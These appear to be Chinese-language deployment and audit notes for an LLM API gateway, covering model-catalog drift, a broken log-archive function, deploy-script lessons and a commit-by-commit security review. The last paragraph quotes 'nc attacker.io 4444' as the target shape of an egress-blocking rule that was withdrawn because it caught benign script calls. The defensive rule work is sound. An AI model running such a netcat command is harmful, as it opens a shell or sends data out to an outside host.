**模型目录漂移仍是实体问题**（也是原拍板项的实体）：12 个凭据、96 个模型名
404/410（nvidia-build-new/v2、endless 各约 80 绑定全灭；sensenova 系 5 凭据；
glm-5.2 系 10×410）。**待 owner 拍板：清退 / 修目录 / 降权**——本轮未动生产数据。

**新发现真 bug**：生产 `archive_request_logs_default` 仍是 754「S-01 首跑即死」
修复前的坏版本（42703），TTL 归档从未工作；重放 754 即修（幂等，步骤在审计文档 §五）。

**观测口径陷阱**：实时数据在 `request_logs_hot`（8h 窗口 → promote 排水到月
分区），查 `request_logs` 父表有 8 小时滞后——审计统计成功率一律用热表或
按 `error_kind` 细分，别再拿父表 `success` 列算比率。

详见 `docs/audit/2026-10-11-154-503-口径修正与漂移清单.md`（含漂移全景表、
401 风暴分析、754 重放步骤）。

## deploy-154.sh 本会话实测（与 245 的差异）

1. 端口：154 本会话结束时 active_port=**8781**（`/opt/llm-gateway-go/run/active-upstream.conf`
   是唯一权威）。部署期间出现过 8782 → 8781 漂移，**探活两个端口都要试**。
2. `--force` 的正确用法：仅当**确认持有者是已死进程**时。上方 245 一节说「别硬抢」
   是针对**并发 checkout 的活部署**。本会话遇到的是我自己上一轮崩在 bash 错误里
   留下的 stale lock（metadata 里的 pid 已不存在、且无 deploy 进程在跑），
   这种 stale 场景用 `--force` 是文档给出的正确恢复路径。
   **判据**：先 `cat` 锁 metadata 看 pid/source_user，再 `pgrep -af deploy` 确认无活进程。
3. 前端依赖：`web-mobile/package-lock.json` 与 `package.json` 不同步会让
   `npm ci` **整体失败**（连构建都不开始）。已用
   `npm install --package-lock-only` 重生成修过一次；**改依赖后记得同步**。
4. 部署全程需要：`PATH` 含 `~/sdk/go/bin`（go1.27.1）与
   `~/sdk/bash5/bin`（deploy-lib bash 4+ 语法），否则分别在后端构建与 lib 加载处失败。

## 2026-10-11 晚间 24h 审计轮（窗口 10-10 22:16 → 10-11 21:16，46 提交逐条批审）

**拉取**：快进合并 `9fe5320b6..b98678fc5`（6 提交：SPA 深链 401 放行 r2540、
host-first 孤儿网关回收 + 517 形态探测 r2538、mobile UX 第二轮、252 netbird 文档、
12h 审计 A1/A2、r1016/r1017 生产复验文档）。

**全门状态（本轮实测）**：`go build ./...`、`go vet ./...` rc=0；
`apply-db-revision-sequence_test` rc=0；installer 13 包全绿；
`CGO_ENABLED=0 go test ./admin/... ./bg/... ./settings/... ./domains/stats/...`
仅负向闸门 `TestV1BodiesReadersAreAssessed` 一红（维护者策略）；新增测件
`middleware`（含 auth_mw 三件套）ok、`tests/deploy_local_reap_test.sh` rc=0；
`security/...` 全绿、`domains/streaming` ok（168s）；web-mobile 193 文件
7177 测试全绿。

**三族实质发现（已修/已登记）**：

1. **a60391fb0（SPA 深链 text/html 放行）放行面核验通过，但安全性是隐式的**——
   逐条核验了 AuthMiddleware 守卫范围内全部 mux 路径：`/internal/*`、
   `/api/v1/plugins/*` 自带 AdminToken/AdminMiddleware 守卫；
   `/v1beta/models/`（**不匹配** `/v1` 前缀判断）与 `/v1/models/` 挂的
   GeminiHandler 对列表形状 404、对 `:generateContent` 交给 ChatHandler
   内嵌 keyVerifier 段二次鉴权（handler.go:2315，fail-closed）——无匿名暴露面。
   已在 `middleware/auth_mw.go` 的 `spaProtectedPrefixes` 上补维护契约注释：
   未来把无自守卫的新 handler 挂顶层路径必须同步加清单，否则 text/html 匿名直达。
2. **9fe5320b6 A2 的 `PermanentlyDisabled`/`PermanentRejections` 无生产消费方**
   （Stats() 只被测试调用）——自禁用事件有 slog.Error 兜底（日志可见），
   缺聚合视图，P3 遗留：接线到 /metrics 或 admin 端点留给下轮。
3. **AGENTS SSOT 段文档失真已更正**（上方「SSOT 软链的真实情况」节）：
   下午「ai-native-tools 已消失、软链有效」对本 checkout 不成立，实测
   ai-native-tools 在场、ai-native-workspace 不在、软链断——多 checkout/
   多机事实不同，用前先 ls。

**遗留（登记不修）**：12272e57c 的 EOL 识别靠措辞 contains（"end of life"/
"no longer available"），上游换文案会漏判回凭据级（probe 风暴复发点）；
窗口外 8 条 UNMERGED 远端分支（最后提交 ≤09-28，清单见审计输出）按保守口径
只登记不删；本地 2 条已合并 sanitize 分支同口径。

**分支窗口结论**：24h~1h 窗口内零未合并分支，无需删/合并动作。

**补充（推送时合并进来的 r1018，a39bb6769）**：并行会话对 r1016/r1017 做批判审计，
发现两条自引入的大面积误伤——`pkg@1.2.3` 被 egressHostFromUserInfo 当成
`user@host` 整类阻断装包命令；`nc attacker.io 4444` 收口正则误伤
`node server.js 8080` 形态的脚本调用。r1018 撤掉这两条有害提取规则（其原覆盖面
本就由 email/IP 规则 + r1017 的 isNonExfiltrationEmailFragment 兜住）。
**本晚间审计轮批读 a3b65ba68 时未深审到这两个误伤面，属审计盲区，如实记录**。
下一轮生产复验若见「装包/脚本调用不再被阻断」即 r1018 效果，非回归。
